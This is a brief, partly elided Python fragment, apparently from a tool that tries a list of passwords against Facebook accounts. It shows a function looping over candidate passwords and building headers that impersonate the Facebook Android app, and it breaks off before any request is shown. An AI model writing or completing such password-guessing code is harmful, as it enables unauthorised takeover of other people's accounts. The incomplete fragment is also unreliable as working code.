    ...
    def __MTDONEE__(sid, name, psw,tl):
        try:
            ...
            for pw in psw:
                ...
                headers = {'User-Agent':"Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.91 Mobile Safari/537.36 [FBAN/FB4A;FBAV/350.0.0.34.112;FBPN/com.facebook.katana;FBLC/th_TH;FBBV/239243294;FBDM/{density=3.0,width=1080,height=1920};FBFW/1;FBSF/4.0]",
